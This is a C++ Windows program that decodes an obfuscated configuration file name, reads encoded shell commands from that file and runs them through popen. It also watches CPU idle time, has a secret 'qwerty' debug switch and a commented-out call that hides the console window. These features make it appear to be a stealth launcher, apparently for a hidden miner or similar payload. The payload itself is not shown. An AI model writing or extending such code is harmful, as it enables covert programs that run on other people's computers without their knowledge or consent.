#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <vector>

//#include <memory>
//#include <future>
//#include <mutex>
#include <thread>
//#include <chrono>
//#include <condition_variable>
//#include <deque>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

FILE* pipe = NULL;
int CPU = 0;
int IdleTime = 0;
vector<hide::line> Run;
bool    show_cpu = true;

/*
 * ==================
 */
void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
static string percent;
static char buff[16];
FILE* wmic = popen("wmic cpu get loadpercentage", "r"); 
if(!wmic)
    throw runtime_error("wmic fail");

while( fgets(buff, sizeof(buff), wmic)!=NULL) {
    percent = buff;
    if ( isdigit( *percent.begin()) ) break;
}
pclose(wmic);
istringstream sper(percent);
sper >> CPU;
if (show_cpu) cout << CPU << endl;
if ((100 - CPU) > 25)
   ++IdleTime;  
else IdleTime = 0;

if (IdleTime == 100) ;
}

/*
 * ==================
 */
void Timer (void) {
::SetTimer (NULL, 0, 3000, (TIMERPROC) &CPUsage);

static MSG msg;
while( ::GetMessage(&msg, NULL, 0, 0)) {
    ::TranslateMessage(&msg);
    ::DispatchMessage(&msg);
}
}

/*
 * ======= M A I N =======================
 */
int main (int argc, char** argv
) {
try {

static bool cons = false;
if (argc > 1) {
    string arg(argv[1]);
    if (arg == "qwerty") cons = true;
}

//if (!cons) ShowWindow( GetConsoleWindow(), SW_HIDE );

static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
    name.decode();
    if (cons) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open())
        throw runtime_error(name + ": file not open");

static hide::line arg, Args;

while ( getline(ini, arg)) {
    if ( *(arg.begin()) == '#') {
        Args.append(" 2>&1");
        Run.push_back(Args);
        Args.clear();
        continue;
    }
    arg.decode();
    if (cons)
            cout << arg << endl;
    Args.append(arg);
}

if (cons) {
    cout << Args << endl;
    throw runtime_error("^^^ eof");
}
if ( !Run.size())
    throw runtime_error("Empty config, never mind");

pipe = ::popen( Run[0].c_str(), "r"); 
if(!pipe)
    throw runtime_error(Run[0] + ": popen fail");

thread th1(Timer);
th1.detach();

static string console;
while ( getline (cin, console)) {
cout << console << " what?!" << endl;
}

return 0;
} catch (const exception& e) {
//    cerr << e.what() << endl;
if(pipe) pclose(pipe);
return 1;
}}
